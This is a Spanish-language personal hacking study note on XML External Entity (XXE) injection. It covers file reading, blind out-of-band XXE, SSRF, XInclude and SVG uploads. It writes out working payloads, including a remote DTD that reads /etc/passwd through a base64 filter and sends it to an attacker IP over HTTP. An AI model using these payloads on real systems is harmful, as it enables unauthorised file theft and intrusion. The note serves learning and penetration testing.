________
- Tags: #inyeccion  #explotacion  #web #xml #xxe #file_uploads
______

El lenguaje de marcado extensible (XML) es un **lenguaje de marcado que proporciona reglas para definir cualquier dato**. A diferencia de otros lenguajes de programación, XML no puede realizar operaciones de computación por sí mismo.

Ejemplo de estructura de datos en XML:
![[Pasted image 20240704171055.png]]

Si se usa este método en una página web, es propenso a ser vulnerable a XXE.

A base de "entidades" que podemos definir en esta misma estructura, podemos leer archivos internos, listar directorios y llevar a otras vulnerabilidades como [SSRF](Hack/OWASP%2010%20y%20WEB/SSRF.md) o un RCE.

Incluso si la web no nos muestra ningún "output" procedente de los datos en el XML, aún podemos tratar de explotarlo. Esto se llamaría XXE OOB o ciego.

_______
Podemos leer archivos creando una entidad junto con el wrapper file:// :

![[Pasted image 20240704171839.png|1225]]

Como podemos ver, para llamar a una entidad creada, se hace de esta forma: ``&nombreentidad;``

_______
## XXE OOB / Ciego

A veces la página no nos dejará crear entidades. En estos casos, crearemos y llamaremos la entidad desde el propio DTD.

- Nota: el DTD es la parte del código donde se crea la entidad, la que empieza por ``<! DOCTYPE foo ``...

Para hacer esto, usaremos la siguiente estructura: ``<!DOCTYPE foo [<!ENTITY % file SYSTEM "http://IPLOCAL:8000/testXXE"> %file;]>`` 
Ejecutando esto, recibiremos una petición a nuestro servidor de atacante ya que la pagina intenta cargar una entidad que referencia a un servidor externo.
![[Pasted image 20240704173323.png]]

Pasamos a hacer una explotación real con este método. El objetivo será que la maquina victima que no representa el output del XML, me envíe el contenido de un archivo, en este caso /etc/passwd en base64 a través de una petición GET.

Primero inyectamos en la petición un DTD que cargue un archivo que nosotros crearemos con más DTDs que harán el trabajo:
``<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.37.135:8000/malicious.dtd"> %xxe;]>``

- Nota: Haremos que nos lo envíe en base-64 porque con este método el wrapper file:// no funcionará correctamente.

Pasaremos a crear el archivo al cual la página vulnerable hará la petición:
```
<!ENTITY % archivo SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.37.135:8000/?file=%archivo;'>">
%eval;
%exfil;
```

**Explicación linea a linea:**

1. Creamos la entidad que hará que la página cargue el archivo
2. Creamos una entidad que se encargará de crear otra entidad que la página haga la petición
3. y 4. Lamamos a las entidades creadas en la línea dos.

Boom.
![[Pasted image 20240704175118.png]]

________
## XXE to SSRF

![[Pasted image 20240704181222.png]]

______
## XXE XInclude

Usado cuando la aplicación usa un xml por detrás pero tu no tienes acceso a este:
![[Pasted image 20240708153550.png]]

[Ver más:](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#xinclude)
_________
## File Uploads

Si eres capaz de subir un archivo SVG a una aplicación, podrás inyectar entidades externas a través de dicho archivo:
[Ver mas:](https://www.exploit-db.com/docs/49732)